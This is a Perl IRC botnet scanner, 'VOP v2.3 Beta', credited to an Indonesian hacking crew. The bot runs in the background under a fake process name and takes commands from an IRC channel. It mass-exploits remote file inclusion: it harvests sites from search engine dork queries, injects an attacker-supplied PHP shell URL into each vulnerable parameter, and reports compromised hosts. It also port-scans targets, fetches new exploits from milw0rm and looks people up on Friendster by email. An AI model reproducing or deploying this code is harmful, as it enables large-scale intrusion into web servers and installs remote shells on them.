#!/usr/bin/perl

# VOP v2.3 Beta
#####################################################################################################
#                                                                                                   #
#                           Powered by Vaksin13, OoN_Boy, Paman                                     #
#                                    [[  VOP CREW !!! ]]                                            #
#                #Baliemhacker@dalnet, #batamhacker@dalnet, #becak@dalnet                           #
#                    http://baliemhekerforum.co.nr & http://oon.web.id                              #
#                                                                                                   #
#         #hacking@indoirc, #hacking@mildnet, #hacking@indonesiairc, #hacking@allnetwork            #
#                                                                                                   #
#####################################################################################################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

my $processo = $ARGV[4];
my $cek=$ARGV[5];
my $cmd=$ARGV[6];
my $server=$ARGV[0];
my $porta="6667";
my $nick=$ARGV[1];
my $canale='#'.$ARGV[2];
my $verbot = "BHT";
my @admin=$ARGV[3];

my $cmdsukses= "=======================================\nServer:$server\nNick:$nick, Chan:$canale, Admin:@admin\nFakeProc:$processo\nInjector:$cek\nPHPShell:$cmd\n=======================================\nBot Loaded Successfully...\n=======================================\n";
$cmderror= "=======================================\n.Wrong Input.\nType: perl <source> <irc.server.net> <botnick> <channel> <fakeprocess> <injector> <phpshell>. Read source code for more help.\n=======================================\n";
if (! $ARGV[1]){die ($cmderror);}if (! $ARGV[2]){die ($cmderror);}if (! $ARGV[3]){die ($cmderror);}if (! $ARGV[4]){die ($cmderror);}if (! $ARGV[5]){die ($cmderror);}if (! $ARGV[6]){die ($cmderror);}
print $cmdsukses;

my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER T-Oi 8 *  : T-Oi : vopcrew at gmail.com : Gbot :Sbot\r\n";
print $sk "JOIN $canale\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG @admin :!bye/){
stampa($sk, "QUIT");
}

if ($line=~ /PRIVMSG $canale :!help/){
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 Scanning      4: 7!scan <Bug> <Dork>");
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 Engine Search 4: 7!engine4");
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 New Vulns     4: 7!milw0rm");
sleep 1;
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 Scan Port     4: 7!nmap <ip/host>");
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 Test Target   4: 7!injek <http://target.com/bug.php?bug=>");
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 Cek Friendster4: 7!fs <email>");
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 About         4: 7!about");
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 About         4: 7!VOP");
stampa($sk, "PRIVMSG $canale :15(7@2Help15)12 About         4: 7!homo");
}

if ($line=~ /PRIVMSG $canale :!info/){
stampa($sk, "PRIVMSG $canale :4O.o stress ini anak -.-!!");
}

if ($line=~ /PRIVMSG $canale :!about/){
stampa($sk, "PRIVMSG $canale :15(7@2This is BOTnet VOP v2.3 Beta Scanner Use It For Your Own RISK!! FUKT YOU ALL!!15)");
}

if ($line=~ /PRIVMSG $canale :!homo/){
stampa($sk, "PRIVMSG $canale :15(7@ 211,12www.mathematics.its.ac.id/gay.txt15)");
}
if ($line=~ /PRIVMSG $canale :!VOP/){
stampa($sk, "PRIVMSG $canale :15(7@2VOP crew : Vaksin13 OoN_BoY Paman Contact Us On vopcrew at gmail.com15)");
}

if ($line=~ /PRIVMSG $canale :!engine/){
stampa($sk, "PRIVMSG $canale :15(7@2Engine Search15)12 Google, Yahoo, MsN, Altavista, Libero, AllTheWeb, AsK, UoL, AoL.");
}

if ($line=~ /PRIVMSG $canale :!injek (.*)/) {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $urlweb=$1.$cek."?";
my $target= $1;
my $printing=$target."12".$cmd."?";
my $reqis=HTTP::Request->new(GET=>$urlweb);
my $uais=LWP::UserAgent->new();
$uais->timeout(5);
my $responseshell=$uais->request($reqis);
if ($responseshell->is_success) {
my $wew=$responseshell->content;
if($wew =~ /memex_off/ ){
stampa($sk, "PRIVMSG $canale :15(13@12Injek15)4 ".$printing." 15(7@12SAFEMODE-OFF15)");
}
elsif($wew =~ /memex_on/)
{
stampa($sk, "PRIVMSG $canale :15(13@12Injek15)4 ".$printing." 15(7@4SAFEMODE-ON15)");
}
else {
stampa($sk, "PRIVMSG $canale :15(13@12Injek15)4 ".$printing." 15(7@4NOT-WORK !!!15)");
}}}
exit;
}}

if ($line =~ /PRIVMSG $canale :!fs (.*)/) {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
$urlfs ="http://www.friendster.com/usersearch.php?search=1&country=ID&usearch=".$1;
$emailfs = $1;
stampa($sk, "PRIVMSG $canale :15(13@12FriendSter15) 12BRB... Cari FS ".$emailfs."");
my $reqpx=HTTP::Request->new(GET=>$urlfs);
my $uarx=LWP::UserAgent->new();
$uarx->timeout(10);
my $responsefsfsfs=$uarx->request($reqpx);
$pagefx = $responsefsfsfs->content;
while ($pagefx =~  m/View profile\" src=\"?http:\/\/([^>\"]+)\"?>/g)
{
push (@lst_fs,$1);
$cocokann = "@lst_fs";
if( $cocokann eq "images.friendster.com/images/nophoto.jpg" ){
stampa($sk, "PRIVMSG $canale :15(13@12FriendSter15) 12Capedech... ada FS nya tapi gak ada foto na euy!!");
}else {
stampa($sk, "PRIVMSG $canale :15(13@12FriendSter15) 12Saya dapet foto nya4 $emailfs 12:2 [http://@lst_fs]");
}
}if($cocokann eq ""){
stampa($sk, "PRIVMSG $canale :15(13@12FriendSter15) 12Capedech... gak ada tuh fs4 $emailfs");
}}
exit;
}}

if ($line=~ /PRIVMSG $canale :!nmap (.*)/) {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $hostip="$1";
my @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4000","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","9997","10000","12345","19150","27374","31310","33133","33733","55555");
my (@aberta, %porta_banner);
stampa($sk, "PRIVMSG $canale :15(7@2Nmap15)7 Nm4p for .V.O.P. v1.0 by Vrs-hCk");
stampa($sk, "PRIVMSG $canale :15(7@2Nmap15)7 Starting nm4p v1.0 ( 3http://baliemhekerforum.co.nr7 )");
stampa($sk, "PRIVMSG $canale :15(7@2Nmap15)7 Scanning4 ".$1." 12for open ports.");
foreach my $porta (@portas){
my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
if ($scansock) {
push (@aberta, $porta);
$scansock->close;
}}
if (@aberta) {
stampa($sk, "PRIVMSG $canale :15(7@2Nm4p15)7 Nm4p finished: (12".$1."7)4 @aberta");
} else {
stampa($sk, "PRIVMSG $canale :15(7@2Nm4p15)7 Note: (4".$1."7) Host seems down. If it is really up, but blocking our ping.");
}}
exit;
}}

if ($line=~ /PRIVMSG $canale :!milw0rm/){
my @ltt=();
my @bug=();
my $x;
my $page="";
my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$socke>;
$page="@r";
close($socke);
while ($page =~  m/<title>(.*)</g){
$x = $1;
if ($x =~ /\&lt\;/) {
$x =~ s/\&lt\;/</g;
}

if ($x !~ /milw0rm/) {
push (@bug,$x);
}}
while ($page =~  m/<link.*expl.*([0-9]...)</g) {
if ($1 !~ m/milw0rm.com|exploits|en/){
push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
}}
stampa($sk, "PRIVMSG $canale :15(7@2Milw0rm15)12 Millw0rm New Bugs");
foreach $x (0..(@ltt - 1)) {
stampa($sk, "PRIVMSG $canale :15(7@2Milw0rm15)7 @3 $bug[$x] - $ltt[$x]");
sleep 1;
}}

if ($line=~ /PRIVMSG $canale :!scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
stampa($sk, "PRIVMSG $canale :15(7@2Dork:4 $dork15)");
stampa($sk, "PRIVMSG $canale :15(7@2Bugz:4 $bug15)");
stampa($sk, "PRIVMSG $canale :15(7@4Engine Search15)12 Starting the Proccess");
my @glist=&google($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 Google ".scalar(@glist).".");
my @ylist=&yahoo($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 Yahoo ".scalar(@ylist).".");
my @mlist=&msn($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 MsN ".scalar(@mlist).".");
my @alist=&altavista($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 Altavista ".scalar(@alist).".");
my @llist=&libero($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 Libero ".scalar(@llist).".");
my @allist=&alltheweb($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 AllTheWeb ".scalar(@allist).".");
my @asklist=&ask($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 Ask ".scalar(@asklist).".");
my @uollist=&uol($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 UoL ".scalar(@uollist).".");
my @aollist=&aol($dork);
stampa($sk, "PRIVMSG $canale :15(6@7VOP15)12 AoL ".scalar(@aollist).".");
push(my @tot, @glist, @ylist, @mlist, @alist, @llist, @allist,@asklist,@uollist,@aollist);
stampa($sk, "PRIVMSG $canale :15(7@2Engine Search15)12 15(7@2Total15)4 ".scalar(@tot)." 12Sites.");
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :15(7@2Engine Search15)(7@2Clean15)4 ".scalar(@puliti)." 12Sites.");
stampa($sk, "PRIVMSG $canale :15(7@2Sites Scanned15)(7@2Dorkz15)4 $dork");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{

$contatore++;
if ($contatore %50==0){
stampa($sk, "PRIVMSG $canale :15(7@3Exploiting15)10 Testing :6 ".$contatore." 10of6 ".$uni." 10Sites.");
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :15(7@4Finish15)12 Scan Finished. 4Dork 12:7 $dork");
}
my $test="http://".$sito.$bug.$cek."?";
my $print="http://".$sito."12".$bug."7".$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /memex_off/ ){
my $hs=geths($print); $hosts{$hs}++;
stampa($sk, "PRIVMSG $canale :15(13@12VOP15)4 ".$print." 15(7@12SAFEMODE-OFF15)");
}
elsif($re =~ /memex_on/)
{
stampa($sk, "PRIVMSG $canale :15(13@12VOP15)4 ".$print." 15(7@4SAFEMODE-ON15)");
}
}}}
exit;
}}}


sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}

sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<em class=yschurl>(.+?)\<\/em>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub libero(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
{
my $Lib=("http://arianna.libero.it/search/abin/integrata.cgi?s=1&pag=".$pg."&start=".$i."&query=".key($key));
my $Res=query($Lib);
while($Res =~ m/<a class=\"testoblu\" href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
$chiave =~ s/\[/%5B/g;
$chiave =~ s/\]/%5D/g;
$chiave =~ s/ /+/g;
$chiave =~ s/:/%3A/g;
$chiave =~ s/\(/%28/g;
$chiave =~ s/\)/%29/g;
$chiave =~ s/#/%231/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}
